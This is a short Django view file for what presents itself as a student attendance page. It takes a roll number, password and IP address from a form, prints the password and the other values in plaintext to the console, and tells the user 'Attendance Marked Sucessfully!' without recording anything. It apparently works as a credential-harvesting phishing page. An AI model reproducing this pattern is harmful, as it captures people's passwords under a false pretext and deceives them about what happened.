from django.shortcuts import render

# Create your views here.

def index(request):
    if request.method == "GET":
        return render(request, "index.html")
    
    if request.method == "POST":
        rollno = request.POST['rollno']
        password = request.POST['password']
        ip = request.POST['ip']

        print("+-------------------------------------+")
        print("+-------------------------------------+")
        print(rollno)
        print(password)
        print(ip)
        print("+-------------------------------------+")
        print("+-------------------------------------+")

        return render(request, "status.html", {
            "icon" : 'icon_good.svg',
            "status" : """<p>Attendance Marked Sucessfully!<p>"""
        })


        
